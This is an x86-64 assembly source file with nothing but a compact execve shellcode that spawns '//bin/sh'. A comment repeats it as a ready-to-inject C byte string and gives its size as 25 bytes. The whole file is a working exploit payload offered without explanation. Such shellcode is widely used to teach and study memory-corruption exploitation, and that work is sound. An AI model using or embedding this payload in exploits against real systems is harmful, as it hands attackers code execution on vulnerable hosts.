.text
.globl _start
_start:
	xor %rsi,%rsi
	mul %rsi
	push %rdx			 # null-terminator byte(s)
	movabs $0x68732f6e69622f2f, %rdi #
	push %rdi			 # //bin/sh
	mov %rsp, %rdi			 # "//bin/sh" address
	movb $0x3b,%al			 # sys_execve
	syscall

# char shellcode[] = "\x48\x31\xf6\x48\xf7\xe6\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05";
# /* Total: 25 bytes. */
